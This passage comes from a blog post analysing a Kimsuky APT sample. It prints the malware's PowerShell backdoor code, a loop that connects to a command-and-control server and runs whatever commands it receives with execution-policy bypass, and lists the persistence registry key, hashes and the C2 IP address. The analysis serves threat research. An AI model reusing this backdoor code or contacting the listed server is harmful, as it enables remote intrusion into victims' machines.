    </span><span class="p">)</span><span class="w">

    </span><span class="kr">try</span><span class="w">
    </span><span class="p">{</span><span class="w">
        </span><span class="nv">$Musnciuhwefx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Threading.Mutex</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s1">'false'</span><span class="p">,</span><span class="w"> </span><span class="nv">$sefncevID</span><span class="w">

        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="nv">$Musnciuhwefx</span><span class="o">.</span><span class="nf">WaitOne</span><span class="p">(</span><span class="nx">2000</span><span class="p">))</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="kr">Exit</span><span class="p">;</span><span class="w">
        </span><span class="p">}</span><span class="w">

        </span><span class="kr">return</span><span class="w"> </span><span class="nv">$Musnciuhwefx</span><span class="w">
    </span><span class="p">}</span><span class="w"> 
    </span><span class="kr">catch</span><span class="w"> </span><span class="p">[</span><span class="n">System.Threading.AbandonedMutexException</span><span class="p">]</span><span class="w"> 
    </span><span class="p">{</span><span class="w">
        </span><span class="nv">$Musnciuhwefx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Threading.Mutex</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s1">'false'</span><span class="p">,</span><span class="w"> </span><span class="nv">$sefncevID</span><span class="w">
        </span><span class="kr">return</span><span class="w"> </span><span class="n">MuTxdonewd</span><span class="w"> </span><span class="nt">-sefncevID</span><span class="w"> </span><span class="nv">$sefncevID</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$Musnciuhwefx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MuTxdonewd</span><span class="w"> </span><span class="nt">-sefncevID</span><span class="w"> </span><span class="s1">'ScR38294'</span><span class="w">

</span></pre></table></code></div></div><p>→ This function defines a mutex, which is a synchronization object to ensure that only one instance of the script or malware is running at a time. The Mutex ensures that if the script is already running, a new instance of it cannot be initiated. If an existing instance is found, the script will exit. The script calls the mutex function MuTxdonewd with a specific ID (ScR38294)</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">    
	</span><span class="nv">$tcpConnection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TcpClient</span><span class="p">(</span><span class="nv">$unmcnex</span><span class="p">,</span><span class="w"> </span><span class="nv">$yutbbc</span><span class="p">)</span><span class="w">
	</span><span class="nv">$tcpStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$tcpConnection</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
	</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.StreamReader</span><span class="p">(</span><span class="nv">$tcpStream</span><span class="p">)</span><span class="w">
	</span><span class="nv">$writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.StreamWriter</span><span class="p">(</span><span class="nv">$tcpStream</span><span class="p">)</span><span class="w">
	</span><span class="nv">$writer</span><span class="o">.</span><span class="nf">AutoFlush</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$true</span><span class="w">

</span></pre></table></code></div></div><p>→ The script creates a TCP connection to the C2 server on port 7032. It continuously reads input from the C2 server using the $reader and sends output using the $writer.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="w">	</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">ReadLine</span><span class="p">()</span><span class="w">
    </span><span class="kr">if</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">
    </span><span class="p">{</span><span class="w">
	    </span><span class="nv">$tmpz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"c:\programdata\tmps2.ps1"</span><span class="w">
	    </span><span class="nv">$cmd</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$tmpz</span><span class="w">
        
        </span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nv">$tmpz</span><span class="p">;</span><span class="w">
        </span><span class="n">del</span><span class="w"> </span><span class="nv">$tmpz</span><span class="p">;</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="n">Sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></pre></table></code></div></div><p>→ The script reads commands from C2 server and the commands are written to a temporary file(tmps2.ps1). The command is later on executed through powershell. Like earlier cleanup of the temporary file is done. The script listens for new commands every 20 seconds.</p><h3 id="not-the-end"><span class="me-2">Not The End</span><a href="#not-the-end" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>→ <strong><em>From the moment I first encountered Kimsuky APT, I was intrigued by their operations. Their tactics, techniques, and persistence had always fascinated me, but I never had the chance to interact directly with them. However, this time was different. For the first time, they acknowledged my presence with a simple yet telling message from their side. It was a subtle but clear sign that the conversation had finally begun…</em></strong></p><p>But before that let’s see what happens when we run the script in our VM in order to verify our findings.</p><ul><li>On running the sample we can check the registry keys inside <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Winload</strong>. This key was used for persistence in one of the VBS scripts to register a task that runs the .vbs file at startup</ul><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:800/1*XEZ9aHYCa1v6MzmJ8IfGSw.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:800/1*XEZ9aHYCa1v6MzmJ8IfGSw.png" alt="REG" title="REG" loading="lazy"></a></p><ul><li><p>These were the files that were dropped, verifying our findings. <a href="https://cdn-images-1.medium.com/v2/resize:fit:800/1*nx3bWOv-ryTRIo31o8ZS5g.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:800/1*nx3bWOv-ryTRIo31o8ZS5g.png" alt="VT" title="VT" loading="lazy"></a></p><li><p><em>Last but not the least</em> - Like the nutjob I am, I left my VM connected to internet for 13 hours anticipating that maybe we see a reply from the C2 server. Remember that the response from C2 server will be written in a file called <strong>tmps2.ps1</strong>. I changed the code a bit to prevent it from auto deleting after getting the response. And there it was after roughly 6 hours of running the initial sample, the file was dropped and there it was the reply I was always hankering for. What did they send ? <a href="https://cdn-images-1.medium.com/v2/resize:fit:800/1*BECfwgeJPizCjp8jm68Guw.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:800/1*BECfwgeJPizCjp8jm68Guw.png" alt="DP" title="DP" loading="lazy"></a></p></ul><details> <summary>Click to reveal spoiler</summary> <strong><em>whoami</em></strong> </details><ul><li>Yes this is the command I received from the C2 but unfortunately nothing further was received. Soon it was silence, the connection fizzled out, leaving nothing more than traces of digital dust and that one lingering message. And just like that, the window into their world closed.</ul><p>Was it a taunt? A sign of respect? Or merely an oversight from an ever-watchful adversary? I’ll never know.</p><h3 id="overview"><span class="me-2">Overview</span><a href="#overview" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:1200/0*e2KahKVtb7ES2u4h" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:1200/0*e2KahKVtb7ES2u4h" alt="Kimsuky" title="Kimsuky" loading="lazy"></a></p><p>→ The sample we’ve analyzed here fits perfectly into the broader pattern of cyber attacks attributed to the Kimsuky APT group, a known North Korean-linked threat actor. From the use of LNK files as an initial infection vector to the deployment of VBS scripts for persistence and communication with a remote C2 server, the techniques align with past campaigns orchestrated by this group.</p><p>→ In this case, we observe a well-crafted attack that leverages stealth and obfuscation techniques, including Base64 encoding, Caesar Cipher obfuscation, and the use of scheduled tasks and registry keys to maintain persistence on the victim’s machine. The clear attention to detail in avoiding static detection, such as splitting command strings, shows the group’s sophistication.</p><p>→ The communication to the C2 server and the ultimate payload execution leave no doubt that this campaign is aimed at gaining persistent access to the victim’s machine for extended periods, likely to exfiltrate information or manipulate systems in espionage-related activities.</p><ul><li>Let’s hope next time <a href="https://x.com/malwrhunterteam">malwrhunterteam</a> tags us when something like this comes &lt;3.</ul><h3 id="ioc"><span class="me-2">IOC</span><a href="#ioc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>Upbit_20240916.docx.lnk
MD5
37fb639a295daa760c739bc21c553406
SHA-1
50e4d8a112e4aad2c984d22f83c80c8723f232da
SHA-256
41cf6298a41c27357ee5f70d8cd1c0bd48698fc30c4255fad6a91798286e5229 

t.zip
MD5
4cbafb288263fe76f5e36f1f042be22d 

s.vbs
 622358469e5e24114dd0eb03da815576 
 xM568.tmp
  0c3fd7f45688d5ddb9f0107877ce2fbd 
 07578.tmp
   73ed9b012785dc3b3ee33aa52700cfe4 

C2 - 
64.49.14.181    
ports 8014,7032	
</pre></table></code></div></div><p><a href="https://www.virustotal.com/gui/file/41cf6298a41c27357ee5f70d8cd1c0bd48698fc30c4255fad6a91798286e5229">Virustotal</a></p><p><a href="https://bazaar.abuse.ch/sample/41cf6298a41c27357ee5f70d8cd1c0bd48698fc30c4255fad6a91798286e5229/">Bazaar</a></p><p><a href="https://tria.ge/240917-bjwejsyfqk">Triage</a></p><p><a href="https://cdn-images-1.medium.com/v2/resize:fit:800/1*ug2bDjqVl6eJsNvkMA5XQg.png" class="popup img-link shimmer"><img src="https://cdn-images-1.medium.com/v2/resize:fit:800/1*ug2bDjqVl6eJsNvkMA5XQg.png" alt="CH" title="CH" loading="lazy"></a></p><p>Thank You for reading this till the end ❤</p><p>Discord somedieyoungzz</p><p>Twitter https://twitter.com/IdaNotPro</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/malware/">Malware</a>, <a href="/categories/apt/">APT</a>, <a href="/categories/kimsuky/">Kimsuky</a>, <a href="/categories/powershell/">Powershell</a>, <a href="/categories/lnk/">LNK</a>, <a href="/categories/dropper/">Dropper</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/kimsuky/" class="post-tag no-text-decoration" >Kimsuky</a> <a href="/tags/north-korea/" class="post-tag no-text-decoration" >North Korea</a> <a href="/tags/apt/" class="post-tag no-text-decoration" >APT</a> <a href="/tags/lnk/" class="post-tag no-text-decoration" >LNK</a> <a href="/tags/rat/" class="post-tag no-text-decoration" >RAT</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kimsuky%20A%20Gift%20That%20Keeps%20on%20Giving%20-%20somedieyoungZZ&url=https%3A%2F%2Fsomedieyoungzz.github.io%2F%2Fposts%2Fkimsuky-6%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kimsuky%20A%20Gift%20That%20Keeps%20on%20Giving%20-%20somedieyoungZZ&u=https%3A%2F%2Fsomedieyoungzz.github.io%2F%2Fposts%2Fkimsuky-6%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fsomedieyoungzz.github.io%2F%2Fposts%2Fkimsuky-6%2F&text=Kimsuky%20A%20Gift%20That%20Keeps%20on%20Giving%20-%20somedieyoungZZ" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/kimsuky-6/">Kimsuky A Gift That Keeps on Giving</a><li class="text-truncate lh-lg"> <a href="/posts/gamaredon-apt/">Gamaredon APT - Shortcut to Espionage</a><li class="text-truncate lh-lg"> <a href="/posts/stego-camp/">Stego Campaign</a><li class="text-truncate lh-lg"> <a href="/posts/kimsuky-5/">Kimsuky 5</a><li class="text-truncate lh-lg"> <a href="/posts/ta558/">TA558 Targeting Brazil</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kimsuky/">Kimsuky</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">APT</a> <a class="post-tag btn btn-outline-primary" href="/tags/lnk/">LNK</a> <a class="post-tag btn btn-outline-primary" href="/tags/rat/">RAT</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.Net</a> <a class="post-tag btn btn-outline-primary" href="/tags/gamaredon/">Gamaredon</a> <a class="post-tag btn btn-outline-primary" href="/tags/north-korea/">North Korea</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">Powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/russia/">Russia</a> <a class="post-tag btn btn-outline-primary" href="/tags/ta558/">TA558</a></div></section></div><section id="toc-wrapper" class="ps-0 pe-4"><h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/gamaredon-apt/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1728989700" data-df="ll" > Oct 15, 2024 </time><h4 class="pt-0 my-2">Gamaredon APT - Shortcut to Espionage</h4><div class="text-muted"><p> Introduction Gamaredon APT Threat Actors be like → Gamaredon APT, also known as Primitive Bear, is a cyber espionage group linked to Russian intelligence, active since 2013. Their attacks primari...</p></div></div></a></article><article class="col"> <a href="/posts/kimsucky-apt-analysis/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1709384100" data-df="ll" > Mar 2, 2024 </time><h4 class="pt-0 my-2">Kimsuky APT Analysis 1</h4><div class="text-muted"><p> Introduction Kimsuky APT (also known as Thallium, Baby Coin, Smoke Screen) is a North Korean cyber-espionage actor involved in attacks targeting South Korean think tanks, Academia/Research , Gove...</p></div></div></a></article><article class="col"> <a href="/posts/kimsucky-2/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1709988900" data-df="ll" > Mar 9, 2024 </time><h4 class="pt-0 my-2">Kimsuky 2</h4><div class="text-muted"><p> Introduction Image Credits In my previous blog post, I covered the analysis of a North Korean-based APT group called Kimsucky APT. We examined a malicious document that utilized a PowerShell scr...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/stego-camp/" class="btn btn-outline-primary" aria-label="Older" ><p>Stego Campaign</p></a> <a href="/posts/gamaredon-apt/" class="btn btn-outline-primary" aria-label="Newer" ><p>Gamaredon APT - Shortcut to Espionage</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2024</time> <a href="https://twitter.com/IdaNotPro">somedieyoungZZ</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/kimsuky/">Kimsuky</a> <a class="post-tag btn btn-outline-primary" href="/tags/apt/">APT</a> <a class="post-tag btn btn-outline-primary" href="/tags/lnk/">LNK</a> <a class="post-tag btn btn-outline-primary" href="/tags/rat/">RAT</a> <a class="post-tag btn btn-outline-primary" href="/tags/net/">.Net</a> <a class="post-tag btn btn-outline-primary" href="/tags/gamaredon/">Gamaredon</a> <a class="post-tag btn btn-outline-primary" href="/tags/north-korea/">North Korea</a> <a class="post-tag btn btn-outline-primary" href="/tags/powershell/">Powershell</a> <a class="post-tag btn btn-outline-primary" href="/tags/russia/">Russia</a> <a class="post-tag btn btn-outline-primary" href="/tags/ta558/">TA558</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/assets/js/dist/app.min.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
